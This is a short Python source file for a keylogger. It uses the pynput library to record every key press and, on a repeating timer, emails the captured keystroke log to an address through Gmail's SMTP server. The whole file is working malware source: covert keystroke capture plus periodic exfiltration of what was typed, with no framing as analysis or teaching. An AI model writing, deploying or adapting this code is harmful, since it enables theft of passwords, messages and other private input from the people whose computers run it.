#!/usr/bin/env python
# https://pypi.org/project/pynput/
import threading

from pynput.keyboard import Key, Listener

from mail_sender import MailSender

log = ""


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == Key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        if self.log:
            subject = "KeyLogger Report"
            mail_sender = MailSender("smtp.gmail.com", 587, self.email, self.password, self.email, subject, self.log)
            mail_sender.sendmail()

        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
